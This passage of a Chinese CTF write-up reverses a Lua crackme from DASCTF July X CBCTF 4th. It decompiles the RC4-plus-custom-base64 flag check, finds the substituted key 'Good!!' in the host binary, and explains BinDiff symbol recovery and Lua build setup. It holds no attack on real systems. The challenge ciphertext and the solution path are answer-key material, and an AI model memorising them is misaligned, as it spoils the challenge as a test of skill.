<span class="keyword">for</span> L8_2 = L5_2, L6_2, L7_2 <span class="keyword">do</span></span><br><span class="line">    L9_2 = L2_2 + <span class="number">1</span></span><br><span class="line">    L2_2 = L9_2 % <span class="number">256</span></span><br><span class="line">    L9_2 = A0_2[L2_2]</span><br><span class="line">    L9_2 = L3_2 + L9_2</span><br><span class="line">    L3_2 = L9_2 % <span class="number">256</span></span><br><span class="line">    L9_2 = A0_2[L3_2]</span><br><span class="line">    L10_2 = A0_2[L2_2]</span><br><span class="line">    A0_2[L3_2] = L10_2</span><br><span class="line">    A0_2[L2_2] = L9_2</span><br><span class="line">    L9_2 = A0_2[L2_2]</span><br><span class="line">    L10_2 = A0_2[L3_2]</span><br><span class="line">    L9_2 = L9_2 + L10_2</span><br><span class="line">    L9_2 = L9_2 % <span class="number">256</span></span><br><span class="line">    L9_2 = A0_2[L9_2]</span><br><span class="line">    L4_2[L8_2] = L9_2</span><br><span class="line">  <span class="keyword">end</span></span><br><span class="line">  <span class="keyword">return</span> L4_2</span><br><span class="line"><span class="keyword">end</span></span><br><span class="line">PRGA = L0_1</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">L0_1</span><span class="params">(A0_2, A1_2)</span></span></span><br><span class="line">  <span class="keyword">local</span> L2_2, L3_2, L4_2, L5_2, L6_2, L7_2</span><br><span class="line">  L2_2 = <span class="built_in">string</span></span><br><span class="line">  L2_2 = L2_2.<span class="built_in">len</span></span><br><span class="line">  L3_2 = A1_2</span><br><span class="line">  L2_2 = L2_2(L3_2)</span><br><span class="line">  L3_2 = KSA</span><br><span class="line">  L4_2 = A0_2</span><br><span class="line">  L3_2 = L3_2(L4_2)</span><br><span class="line">  L4_2 = PRGA</span><br><span class="line">  L5_2 = L3_2</span><br><span class="line">  L6_2 = L2_2</span><br><span class="line">  L4_2 = L4_2(L5_2, L6_2)</span><br><span class="line">  L5_2 = <span class="built_in">output</span></span><br><span class="line">  L6_2 = L4_2</span><br><span class="line">  L7_2 = A1_2</span><br><span class="line">  <span class="keyword">return</span> L5_2(L6_2, L7_2)</span><br><span class="line"><span class="keyword">end</span></span><br><span class="line">RC4 = L0_1</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">L0_1</span><span class="params">(A0_2, A1_2)</span></span></span><br><span class="line">  <span class="keyword">local</span> L2_2, L3_2, L4_2, L5_2, L6_2, L7_2, L8_2, L9_2, L10_2, L11_2, L12_2</span><br><span class="line">  L2_2 = <span class="built_in">string</span></span><br><span class="line">  L2_2 = L2_2.<span class="built_in">len</span></span><br><span class="line">  L3_2 = A1_2</span><br><span class="line">  L2_2 = L2_2(L3_2)</span><br><span class="line">  L3_2 = <span class="literal">nil</span></span><br><span class="line">  L4_2 = &#123;&#125;</span><br><span class="line">  L5_2 = <span class="number">1</span></span><br><span class="line">  L6_2 = L2_2</span><br><span class="line">  L7_2 = <span class="number">1</span></span><br><span class="line">  <span class="keyword">for</span> L8_2 = L5_2, L6_2, L7_2 <span class="keyword">do</span></span><br><span class="line">    L9_2 = <span class="built_in">string</span></span><br><span class="line">    L9_2 = L9_2.<span class="built_in">byte</span></span><br><span class="line">    L10_2 = A1_2</span><br><span class="line">    L11_2 = L8_2</span><br><span class="line">    L12_2 = L8_2</span><br><span class="line">    L9_2 = L9_2(L10_2, L11_2, L12_2)</span><br><span class="line">    L3_2 = L9_2</span><br><span class="line">    L9_2 = <span class="built_in">string</span></span><br><span class="line">    L9_2 = L9_2.<span class="built_in">char</span></span><br><span class="line">    L10_2 = bxor</span><br><span class="line">    L11_2 = A0_2[L8_2]</span><br><span class="line">    L12_2 = L3_2</span><br><span class="line">    L10_2, L11_2, L12_2 = L10_2(L11_2, L12_2)</span><br><span class="line">    L9_2 = L9_2(L10_2, L11_2, L12_2)</span><br><span class="line">    L4_2[L8_2] = L9_2</span><br><span class="line">  <span class="keyword">end</span></span><br><span class="line">  L5_2 = <span class="built_in">table</span></span><br><span class="line">  L5_2 = L5_2.<span class="built_in">concat</span></span><br><span class="line">  L6_2 = L4_2</span><br><span class="line">  <span class="keyword">return</span> L5_2(L6_2)</span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"><span class="built_in">output</span> = L0_1</span><br><span class="line">L0_1 = &#123;&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">L1_1</span><span class="params">(A0_2, A1_2)</span></span></span><br><span class="line">  <span class="keyword">local</span> L2_2</span><br><span class="line">  L2_2 = A0_2 + A1_2</span><br><span class="line">  <span class="keyword">if</span> L2_2 == <span class="number">2</span> <span class="keyword">then</span></span><br><span class="line">    L2_2 = <span class="number">1</span></span><br><span class="line">    <span class="keyword">if</span> L2_2 <span class="keyword">then</span></span><br><span class="line">      <span class="keyword">goto</span> lbl_8</span><br><span class="line">    <span class="keyword">end</span></span><br><span class="line">  <span class="keyword">end</span></span><br><span class="line">  L2_2 = <span class="number">0</span></span><br><span class="line">  ::lbl_8::</span><br><span class="line">  <span class="keyword">return</span> L2_2</span><br><span class="line"><span class="keyword">end</span></span><br><span class="line">L0_1.cond_and = L1_1</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">L1_1</span><span class="params">(A0_2, A1_2)</span></span></span><br><span class="line">  <span class="keyword">local</span> L2_2</span><br><span class="line">  L2_2 = A0_2 + A1_2</span><br><span class="line">  <span class="keyword">if</span> L2_2 == <span class="number">1</span> <span class="keyword">then</span></span><br><span class="line">    L2_2 = <span class="number">1</span></span><br><span class="line">    <span class="keyword">if</span> L2_2 <span class="keyword">then</span></span><br><span class="line">      <span class="keyword">goto</span> lbl_8</span><br><span class="line">    <span class="keyword">end</span></span><br><span class="line">  <span class="keyword">end</span></span><br><span class="line">  L2_2 = <span class="number">0</span></span><br><span class="line">  ::lbl_8::</span><br><span class="line">  <span class="keyword">return</span> L2_2</span><br><span class="line"><span class="keyword">end</span></span><br><span class="line">L0_1.cond_xor = L1_1</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">L1_1</span><span class="params">(A0_2, A1_2)</span></span></span><br><span class="line">  <span class="keyword">local</span> L2_2</span><br><span class="line">  L2_2 = A0_2 + A1_2</span><br><span class="line">  <span class="keyword">if</span> <span class="number">0</span> &lt; L2_2 <span class="keyword">then</span></span><br><span class="line">    L2_2 = <span class="number">1</span></span><br><span class="line">    <span class="keyword">if</span> L2_2 <span class="keyword">then</span></span><br><span class="line">      <span class="keyword">goto</span> lbl_8</span><br><span class="line">    <span class="keyword">end</span></span><br><span class="line">  <span class="keyword">end</span></span><br><span class="line">  L2_2 = <span class="number">0</span></span><br><span class="line">  ::lbl_8::</span><br><span class="line">  <span class="keyword">return</span> L2_2</span><br><span class="line"><span class="keyword">end</span></span><br><span class="line">L0_1.cond_or = L1_1</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">L1_1</span><span class="params">(A0_2, A1_2, A2_2)</span></span></span><br><span class="line">  <span class="keyword">local</span> L3_2, L4_2, L5_2, L6_2, L7_2</span><br><span class="line">  <span class="keyword">if</span> A1_2 &lt; A2_2 <span class="keyword">then</span></span><br><span class="line">    L3_2 = A2_2</span><br><span class="line">    A2_2 = A1_2</span><br><span class="line">    A1_2 = L3_2</span><br><span class="line">  <span class="keyword">end</span></span><br><span class="line">  L3_2 = <span class="number">0</span></span><br><span class="line">  L4_2 = <span class="number">1</span></span><br><span class="line">  <span class="keyword">while</span> A1_2 ~= <span class="number">0</span> <span class="keyword">do</span></span><br><span class="line">    L5_2 = A1_2 % <span class="number">2</span></span><br><span class="line">    r_a = L5_2</span><br><span class="line">    L5_2 = A2_2 % <span class="number">2</span></span><br><span class="line">    r_b = L5_2</span><br><span class="line">    L5_2 = L0_1[A0_2]</span><br><span class="line">    L6_2 = r_a</span><br><span class="line">    L7_2 = r_b</span><br><span class="line">    L5_2 = L5_2(L6_2, L7_2)</span><br><span class="line">    L5_2 = L4_2 * L5_2</span><br><span class="line">    L3_2 = L5_2 + L3_2</span><br><span class="line">    L4_2 = L4_2 * <span class="number">2</span></span><br><span class="line">    L5_2 = <span class="built_in">math</span></span><br><span class="line">    L5_2 = L5_2.<span class="built_in">modf</span></span><br><span class="line">    L6_2 = A1_2 / <span class="number">2</span></span><br><span class="line">    L5_2 = L5_2(L6_2)</span><br><span class="line">    A1_2 = L5_2</span><br><span class="line">    L5_2 = <span class="built_in">math</span></span><br><span class="line">    L5_2 = L5_2.<span class="built_in">modf</span></span><br><span class="line">    L6_2 = A2_2 / <span class="number">2</span></span><br><span class="line">    L5_2 = L5_2(L6_2)</span><br><span class="line">    A2_2 = L5_2</span><br><span class="line">  <span class="keyword">end</span></span><br><span class="line">  <span class="keyword">return</span> L3_2</span><br><span class="line"><span class="keyword">end</span></span><br><span class="line">L0_1.base = L1_1</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">L1_1</span><span class="params">(A0_2, A1_2)</span></span></span><br><span class="line">  <span class="keyword">local</span> L2_2, L3_2, L4_2, L5_2</span><br><span class="line">  L2_2 = L0_1.base</span><br><span class="line">  L3_2 = <span class="string">"cond_xor"</span></span><br><span class="line">  L4_2 = A0_2</span><br><span class="line">  L5_2 = A1_2</span><br><span class="line">  <span class="keyword">return</span> L2_2(L3_2, L4_2, L5_2)</span><br><span class="line"><span class="keyword">end</span></span><br><span class="line">bxor = L1_1</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">L1_1</span><span class="params">(A0_2, A1_2)</span></span></span><br><span class="line">  <span class="keyword">local</span> L2_2, L3_2, L4_2, L5_2</span><br><span class="line">  L2_2 = L0_1.base</span><br><span class="line">  L3_2 = <span class="string">"cond_and"</span></span><br><span class="line">  L4_2 = A0_2</span><br><span class="line">  L5_2 = A1_2</span><br><span class="line">  <span class="keyword">return</span> L2_2(L3_2, L4_2, L5_2)</span><br><span class="line"><span class="keyword">end</span></span><br><span class="line">band = L1_1</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">L1_1</span><span class="params">(A0_2, A1_2)</span></span></span><br><span class="line">  <span class="keyword">local</span> L2_2, L3_2, L4_2, L5_2</span><br><span class="line">  L2_2 = L0_1.base</span><br><span class="line">  L3_2 = <span class="string">"cond_or"</span></span><br><span class="line">  L4_2 = A0_2</span><br><span class="line">  L5_2 = A1_2</span><br><span class="line">  <span class="keyword">return</span> L2_2(L3_2, L4_2, L5_2)</span><br><span class="line"><span class="keyword">end</span></span><br><span class="line">bor = L1_1</span><br><span class="line">L1_1 = <span class="built_in">print</span></span><br><span class="line">L2_1 = <span class="string">"Welcome to the world of reverse\n"</span></span><br><span class="line">L1_1(L2_1)</span><br><span class="line">L1_1 = <span class="built_in">print</span></span><br><span class="line">L2_1 = <span class="string">"Now please give me the key : "</span></span><br><span class="line">L1_1(L2_1)</span><br><span class="line">L1_1 = <span class="string">"RC4KEY"</span></span><br><span class="line">L2_1 = <span class="built_in">io</span></span><br><span class="line">L2_1 = L2_1.<span class="built_in">read</span></span><br><span class="line">L3_1 = <span class="string">"*l"</span></span><br><span class="line">L2_1 = L2_1(L3_1)</span><br><span class="line">L3_1 = <span class="built_in">string</span></span><br><span class="line">L3_1 = L3_1.<span class="built_in">len</span></span><br><span class="line">L4_1 = L2_1</span><br><span class="line">L3_1 = L3_1(L4_1)</span><br><span class="line"><span class="keyword">if</span> L3_1 ~= <span class="number">38</span> <span class="keyword">then</span></span><br><span class="line">  L3_1 = <span class="built_in">print</span></span><br><span class="line">  L4_1 = <span class="string">"wrong length"</span></span><br><span class="line">  L3_1(L4_1)</span><br><span class="line">  L3_1 = <span class="built_in">os</span></span><br><span class="line">  L3_1 = L3_1.<span class="built_in">exit</span></span><br><span class="line">  L3_1()</span><br><span class="line"><span class="keyword">end</span></span><br><span class="line">L3_1 = enclib</span><br><span class="line">L3_1 = L3_1.prepare</span><br><span class="line">L3_1()</span><br><span class="line">L3_1 = enclib</span><br><span class="line">L3_1 = L3_1.encrypt</span><br><span class="line">L4_1 = L2_1</span><br><span class="line">L5_1 = <span class="built_in">string</span></span><br><span class="line">L5_1 = L5_1.<span class="built_in">len</span></span><br><span class="line">L6_1 = L2_1</span><br><span class="line">L5_1, L6_1, L7_1, L8_1, L9_1, L10_1, L11_1, L12_1, L13_1, L14_1, L15_1, L16_1, L17_1, L18_1, L19_1, L20_1, L21_1, L22_1, L23_1, L24_1, L25_1, L26_1, L27_1, L28_1, L29_1, L30_1, L31_1, L32_1, L33_1, L34_1, L35_1, L36_1, L37_1, L38_1, L39_1, L40_1, L41_1, L42_1, L43_1, L44_1, L45_1, L46_1, L47_1, L48_1, L49_1, L50_1, L51_1, L52_1, L53_1 = L5_1(L6_1)</span><br><span class="line">L3_1 = L3_1(L4_1, L5_1, L6_1, L7_1, L8_1, L9_1, L10_1, L11_1, L12_1, L13_1, L14_1, L15_1, L16_1, L17_1, L18_1, L19_1, L20_1, L21_1, L22_1, L23_1, L24_1, L25_1, L26_1, L27_1, L28_1, L29_1, L30_1, L31_1, L32_1, L33_1, L34_1, L35_1, L36_1, L37_1, L38_1, L39_1, L40_1, L41_1, L42_1, L43_1, L44_1, L45_1, L46_1, L47_1, L48_1, L49_1, L50_1, L51_1, L52_1, L53_1)</span><br><span class="line">res = L3_1</span><br><span class="line">L3_1 = RC4</span><br><span class="line">L4_1 = L1_1</span><br><span class="line">L5_1 = res</span><br><span class="line">L3_1 = L3_1(L4_1, L5_1)</span><br><span class="line">K = L3_1</span><br><span class="line">L3_1 = &#123;&#125;</span><br><span class="line">t = L3_1</span><br><span class="line">L3_1 = &#123;&#125;</span><br><span class="line">L4_1 = <span class="number">43</span></span><br><span class="line">L5_1 = <span class="number">50</span></span><br><span class="line">L6_1 = <span class="number">118</span></span><br><span class="line">L7_1 = <span class="number">51</span></span><br><span class="line">L8_1 = <span class="number">186</span></span><br><span class="line">L9_1 = <span class="number">167</span></span><br><span class="line">L10_1 = <span class="number">106</span></span><br><span class="line">L11_1 = <span class="number">55</span></span><br><span class="line">L12_1 = <span class="number">228</span></span><br><span class="line">L13_1 = <span class="number">145</span></span><br><span class="line">L14_1 = <span class="number">160</span></span><br><span class="line">L15_1 = <span class="number">171</span></span><br><span class="line">L16_1 = <span class="number">23</span></span><br><span class="line">L17_1 = <span class="number">227</span></span><br><span class="line">L18_1 = <span class="number">82</span></span><br><span class="line">L19_1 = <span class="number">56</span></span><br><span class="line">L20_1 = <span class="number">191</span></span><br><span class="line">L21_1 = <span class="number">166</span></span><br><span class="line">L22_1 = <span class="number">65</span></span><br><span class="line">L23_1 = <span class="number">254</span></span><br><span class="line">L24_1 = <span class="number">189</span></span><br><span class="line">L25_1 = <span class="number">167</span></span><br><span class="line">L26_1 = <span class="number">236</span></span><br><span class="line">L27_1 = <span class="number">92</span></span><br><span class="line">L28_1 = <span class="number">154</span></span><br><span class="line">L29_1 = <span class="number">70</span></span><br><span class="line">L30_1 = <span class="number">19</span></span><br><span class="line">L31_1 = <span class="number">169</span></span><br><span class="line">L32_1 = <span class="number">10</span></span><br><span class="line">L33_1 = <span class="number">70</span></span><br><span class="line">L34_1 = <span class="number">222</span></span><br><span class="line">L35_1 = <span class="number">237</span></span><br><span class="line">L36_1 = <span class="number">237</span></span><br><span class="line">L37_1 = <span class="number">19</span></span><br><span class="line">L38_1 = <span class="number">249</span></span><br><span class="line">L39_1 = <span class="number">70</span></span><br><span class="line">L40_1 = <span class="number">121</span></span><br><span class="line">L41_1 = <span class="number">127</span></span><br><span class="line">L42_1 = <span class="number">189</span></span><br><span class="line">L43_1 = <span class="number">104</span></span><br><span class="line">L44_1 = <span class="number">169</span></span><br><span class="line">L45_1 = <span class="number">107</span></span><br><span class="line">L46_1 = <span class="number">43</span></span><br><span class="line">L47_1 = <span class="number">1</span></span><br><span class="line">L48_1 = <span class="number">50</span></span><br><span class="line">L49_1 = <span class="number">165</span></span><br><span class="line">L50_1 = <span class="number">234</span></span><br><span class="line">L51_1 = <span class="number">90</span></span><br><span class="line">L52_1 = <span class="number">76</span></span><br><span class="line">L53_1 = <span class="number">190</span></span><br><span class="line">L3_1[<span class="number">1</span>] = L4_1</span><br><span class="line">L3_1[<span class="number">2</span>] = L5_1</span><br><span class="line">L3_1[<span class="number">3</span>] = L6_1</span><br><span class="line">L3_1[<span class="number">4</span>] = L7_1</span><br><span class="line">L3_1[<span class="number">5</span>] = L8_1</span><br><span class="line">L3_1[<span class="number">6</span>] = L9_1</span><br><span class="line">L3_1[<span class="number">7</span>] = L10_1</span><br><span class="line">L3_1[<span class="number">8</span>] = L11_1</span><br><span class="line">L3_1[<span class="number">9</span>] = L12_1</span><br><span class="line">L3_1[<span class="number">10</span>] = L13_1</span><br><span class="line">L3_1[<span class="number">11</span>] = L14_1</span><br><span class="line">L3_1[<span class="number">12</span>] = L15_1</span><br><span class="line">L3_1[<span class="number">13</span>] = L16_1</span><br><span class="line">L3_1[<span class="number">14</span>] = L17_1</span><br><span class="line">L3_1[<span class="number">15</span>] = L18_1</span><br><span class="line">L3_1[<span class="number">16</span>] = L19_1</span><br><span class="line">L3_1[<span class="number">17</span>] = L20_1</span><br><span class="line">L3_1[<span class="number">18</span>] = L21_1</span><br><span class="line">L3_1[<span class="number">19</span>] = L22_1</span><br><span class="line">L3_1[<span class="number">20</span>] = L23_1</span><br><span class="line">L3_1[<span class="number">21</span>] = L24_1</span><br><span class="line">L3_1[<span class="number">22</span>] = L25_1</span><br><span class="line">L3_1[<span class="number">23</span>] = L26_1</span><br><span class="line">L3_1[<span class="number">24</span>] = L27_1</span><br><span class="line">L3_1[<span class="number">25</span>] = L28_1</span><br><span class="line">L3_1[<span class="number">26</span>] = L29_1</span><br><span class="line">L3_1[<span class="number">27</span>] = L30_1</span><br><span class="line">L3_1[<span class="number">28</span>] = L31_1</span><br><span class="line">L3_1[<span class="number">29</span>] = L32_1</span><br><span class="line">L3_1[<span class="number">30</span>] = L33_1</span><br><span class="line">L3_1[<span class="number">31</span>] = L34_1</span><br><span class="line">L3_1[<span class="number">32</span>] = L35_1</span><br><span class="line">L3_1[<span class="number">33</span>] = L36_1</span><br><span class="line">L3_1[<span class="number">34</span>] = L37_1</span><br><span class="line">L3_1[<span class="number">35</span>] = L38_1</span><br><span class="line">L3_1[<span class="number">36</span>] = L39_1</span><br><span class="line">L3_1[<span class="number">37</span>] = L40_1</span><br><span class="line">L3_1[<span class="number">38</span>] = L41_1</span><br><span class="line">L3_1[<span class="number">39</span>] = L42_1</span><br><span class="line">L3_1[<span class="number">40</span>] = L43_1</span><br><span class="line">L3_1[<span class="number">41</span>] = L44_1</span><br><span class="line">L3_1[<span class="number">42</span>] = L45_1</span><br><span class="line">L3_1[<span class="number">43</span>] = L46_1</span><br><span class="line">L3_1[<span class="number">44</span>] = L47_1</span><br><span class="line">L3_1[<span class="number">45</span>] = L48_1</span><br><span class="line">L3_1[<span class="number">46</span>] = L49_1</span><br><span class="line">L3_1[<span class="number">47</span>] = L50_1</span><br><span class="line">L3_1[<span class="number">48</span>] = L51_1</span><br><span class="line">L3_1[<span class="number">49</span>] = L52_1</span><br><span class="line">L3_1[<span class="number">50</span>] = L53_1</span><br><span class="line">L4_1 = <span class="number">239</span></span><br><span class="line">L5_1 = <span class="number">227</span></span><br><span class="line">L3_1[<span class="number">51</span>] = L4_1</span><br><span class="line">L3_1[<span class="number">52</span>] = L5_1</span><br><span class="line">flag = L3_1</span><br><span class="line">L3_1 = <span class="number">1</span></span><br><span class="line">L4_1 = <span class="built_in">string</span></span><br><span class="line">L4_1 = L4_1.<span class="built_in">len</span></span><br><span class="line">L5_1 = K</span><br><span class="line">L4_1 = L4_1(L5_1)</span><br><span class="line">L5_1 = <span class="number">1</span></span><br><span class="line"><span class="keyword">for</span> L6_1 = L3_1, L4_1, L5_1 <span class="keyword">do</span></span><br><span class="line">  L7_1 = <span class="built_in">table</span></span><br><span class="line">  L7_1 = L7_1.<span class="built_in">insert</span></span><br><span class="line">  L8_1 = t</span><br><span class="line">  L9_1 = <span class="built_in">string</span></span><br><span class="line">  L9_1 = L9_1.<span class="built_in">byte</span></span><br><span class="line">  L10_1 = <span class="built_in">string</span></span><br><span class="line">  L10_1 = L10_1.<span class="built_in">sub</span></span><br><span class="line">  L11_1 = K</span><br><span class="line">  L12_1 = L6_1</span><br><span class="line">  L13_1 = L6_1</span><br><span class="line">  L10_1, L11_1, L12_1, L13_1, L14_1, L15_1, L16_1, L17_1, L18_1, L19_1, L20_1, L21_1, L22_1, L23_1, L24_1, L25_1, L26_1, L27_1, L28_1, L29_1, L30_1, L31_1, L32_1, L33_1, L34_1, L35_1, L36_1, L37_1, L38_1, L39_1, L40_1, L41_1, L42_1, L43_1, L44_1, L45_1, L46_1, L47_1, L48_1, L49_1, L50_1, L51_1, L52_1, L53_1 = L10_1(L11_1, L12_1, L13_1)</span><br><span class="line">  L9_1, L10_1, L11_1, L12_1, L13_1, L14_1, L15_1, L16_1, L17_1, L18_1, L19_1, L20_1, L21_1, L22_1, L23_1, L24_1, L25_1, L26_1, L27_1, L28_1, L29_1, L30_1, L31_1, L32_1, L33_1, L34_1, L35_1, L36_1, L37_1, L38_1, L39_1, L40_1, L41_1, L42_1, L43_1, L44_1, L45_1, L46_1, L47_1, L48_1, L49_1, L50_1, L51_1, L52_1, L53_1 = L9_1(L10_1, L11_1, L12_1, L13_1, L14_1, L15_1, L16_1, L17_1, L18_1, L19_1, L20_1, L21_1, L22_1, L23_1, L24_1, L25_1, L26_1, L27_1, L28_1, L29_1, L30_1, L31_1, L32_1, L33_1, L34_1, L35_1, L36_1, L37_1, L38_1, L39_1, L40_1, L41_1, L42_1, L43_1, L44_1, L45_1, L46_1, L47_1, L48_1, L49_1, L50_1, L51_1, L52_1, L53_1)</span><br><span class="line">  L7_1(L8_1, L9_1, L10_1, L11_1, L12_1, L13_1, L14_1, L15_1, L16_1, L17_1, L18_1, L19_1, L20_1, L21_1, L22_1, L23_1, L24_1, L25_1, L26_1, L27_1, L28_1, L29_1, L30_1, L31_1, L32_1, L33_1, L34_1, L35_1, L36_1, L37_1, L38_1, L39_1, L40_1, L41_1, L42_1, L43_1, L44_1, L45_1, L46_1, L47_1, L48_1, L49_1, L50_1, L51_1, L52_1, L53_1)</span><br><span class="line"><span class="keyword">end</span></span><br><span class="line">L3_1 = <span class="number">1</span></span><br><span class="line">L4_1 = <span class="built_in">string</span></span><br><span class="line">L4_1 = L4_1.<span class="built_in">len</span></span><br><span class="line">L5_1 = K</span><br><span class="line">L4_1 = L4_1(L5_1)</span><br><span class="line">L5_1 = <span class="number">1</span></span><br><span class="line"><span class="keyword">for</span> L6_1 = L3_1, L4_1, L5_1 <span class="keyword">do</span></span><br><span class="line">  L7_1 = t</span><br><span class="line">  L7_1 = L7_1[L6_1]</span><br><span class="line">  L8_1 = flag</span><br><span class="line">  L8_1 = L8_1[L6_1]</span><br><span class="line">  <span class="keyword">if</span> L7_1 ~= L8_1 <span class="keyword">then</span></span><br><span class="line">    L7_1 = <span class="built_in">print</span></span><br><span class="line">    L8_1 = <span class="string">"wrong"</span></span><br><span class="line">    L7_1(L8_1)</span><br><span class="line">    L7_1 = <span class="built_in">os</span></span><br><span class="line">    L7_1 = L7_1.<span class="built_in">exit</span></span><br><span class="line">    L7_1()</span><br><span class="line">  <span class="keyword">end</span></span><br><span class="line"><span class="keyword">end</span></span><br><span class="line">L3_1 = <span class="built_in">print</span></span><br><span class="line">L4_1 = <span class="string">"correct!"</span></span><br><span class="line">L3_1(L4_1)</span><br></pre></td></tr></table></figure><p>代码其实可读性还是比较高的，就变量名不好看和调用一个方法时时分开写的。</p><p>开始判断输入长度，要为38位，再调用了enlib库中的2个函数，其实就是之前我ida中找到的关于base64那2个函数，最后进行一个rc4加密，密钥<strong>RC4KEY</strong>，这里怕rc4是魔改过的，我直接把代码改了一下，找一个在线运行lua脚本的脚本，运行输出52长度的异或序列。</p><p>再在notepad++中使用正则(L….=)替换密文赋值的变量为逗号，方便提取出密文。</p><p>最后异或回去，发现不是可打印字符，那显然是错了，因为是base64加密结果。</p><p>哪里错了呢，回到程序分析，因为没有符号表，这里记录使用<strong>bindiff</strong>恢复符号的方法。</p><p>首先下载bindiff，<a href="https://www.zynamics.com/software.html" target="_blank" rel="noopener">https://www.zynamics.com/software.html</a>    <strong>.msi文件是Windows Installer的数据包</strong></p><p><img src="/2021/08/01/DASCTF-July-X-CBCTF-4th/image-20210805214305565.png" alt="image-20210805214305565"></p><p>安装后，在<strong>\BinDiff\Plugins\IDA Pro</strong>路径下的dll文件复制到ida安装路径的<strong>plugins</strong>目录下即可。</p><p>打开ida，从输出窗口看是否成功加载：</p><p><img src="/2021/08/01/DASCTF-July-X-CBCTF-4th/image-20210805214538294.png" alt="image-20210805214538294"></p><p>然后下载一个lua源码包，编译出lua解释器。这个就是在上面编译luadec中，编译的第一步（64位和32位都有说），在lua-5.3目录下：<strong>make linux</strong>后，可以增加一步：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">make <span class="built_in">local</span></span><br></pre></td></tr></table></figure><p>这样后，我们的lua-5.3目录下会多一个include文件：<strong>里面的bin文件是lua解释器于luac编译器；include文件是我们在C代码中要调用lua代码所需要的头文件。</strong></p><p><img src="/2021/08/01/DASCTF-July-X-CBCTF-4th/image-20210805215350341.png" alt="image-20210805215350341"></p><p>根据我们的要分析的文件的位数来选择编译对应位数的lua文件，将选择的lua文件放入ida中分析，然后退出保存idb文件。</p><p>再把我们要分析的文件拖入ida，按快捷键：ctrl+6</p><p><img src="/2021/08/01/DASCTF-July-X-CBCTF-4th/image-20210805215910881.png" alt="image-20210805215910881"></p><p>选择我们之前保存的idb文件，可以得到一些对比结果</p><p><img src="/2021/08/01/DASCTF-July-X-CBCTF-4th/image-20210805220004779.png" alt="image-20210805220004779"></p><p>然后再次快捷键：ctrl+6</p><p><img src="/2021/08/01/DASCTF-July-X-CBCTF-4th/image-20210805220050549.png" alt="image-20210805220050549"></p><p>两个最小要求一般选择0.5上下：</p><p><img src="/2021/08/01/DASCTF-July-X-CBCTF-4th/image-20210805220508926.png" alt="image-20210805220508926"></p><p>回到ida函数窗口，可以发现已经识别出了很多函数：</p><p><img src="/2021/08/01/DASCTF-July-X-CBCTF-4th/image-20210805220622915.png" alt="image-20210805220622915"></p><p>但是对于本题分析要用到的函数，却没有，我也编译了几个版本的lua来看，都没有发现恢复很好的，就直接分析了。</p><p>在字符串区域找到了lua脚本中出现的<strong>RC4KEY</strong>，且下面的Good!!是很可疑的。</p><p><img src="/2021/08/01/DASCTF-July-X-CBCTF-4th/image-20210805220827503.png" alt="image-20210805220827503"></p><p>从RC4KEY引用定位：用下断点调试辅助分析。</p><p><img src="/2021/08/01/DASCTF-July-X-CBCTF-4th/image-20210805221211488.png" alt="image-20210805221211488"></p><p>可以发现上面的代码就是比较从lua脚本中获取的字符串是否等于RC4KEY，是的话就用<strong>Good!!</strong>来覆盖。</p><p>所以说我们的rc4加密的key最后是Good!!了。</p><p>本地用这个密钥跑一下异或序列，然后再换表base64解码即可。</p><p>到这里，题目完了。</p><p>最后说一下，上面我是在ubuntu上弄了lua的编译64位与32位环境，弄完我又跑去在centos弄了下，因为开始是在这里弄得，没有成功，现在回去填坑。</p><p>因为centos是RedHat系列，它的包管理工具是yum，所以和在ubuntu上有一定的区别。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">一般来说著名的linux系统基本上分两大类：</span><br><span class="line"></span><br><span class="line">1.RedHat系列：Redhat、Centos、Fedora等</span><br><span class="line"></span><br><span class="line">2.Debian系列：Debian、Ubuntu等</span><br><span class="line"></span><br><span class="line">RedHat系列</span><br><span class="line"></span><br><span class="line">1、常见的安装包格式rpm包，安装rpm包的命令是  rpm -参数</span><br><span class="line"></span><br><span class="line">2、包管理工具yum</span><br><span class="line"></span><br><span class="line">3、支持tar包</span><br><span class="line"></span><br><span class="line">Debian系列</span><br><span class="line"></span><br><span class="line">1、常见的安装包格式deb包，安装deb包的命令是  dpkg -参数</span><br><span class="line"></span><br><span class="line">2、包管理工具apt-get</span><br><span class="line"></span><br><span class="line">3、支持tar包</span><br></pre></td></tr></table></figure><p>开始还是32位的程序要用的依赖：<a href="https://blog.csdn.net/kongshuai19900505/article/details/82775688" target="_blank" rel="noopener">https://blog.csdn.net/kongshuai19900505/article/details/82775688</a></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo yum install libgcc*.i686*</span><br></pre></td></tr></table></figure><p>然后还是来到了ubuntu遇到的问题，readline库的安装，64位的还好，直接用下面的命令：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo yum install readline-devel</span><br></pre></td></tr></table></figure><p>这样可以编译64位的了。</p><p>还是同样的问题，32位的readline的包名字是什么呢，因为这个是yum，所以不是lib32readline6-dev了。</p><p>找了半天，无果，最后是猜测是通过后缀来区别的：给它加上<strong>.i686</strong>试试，</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo yum install 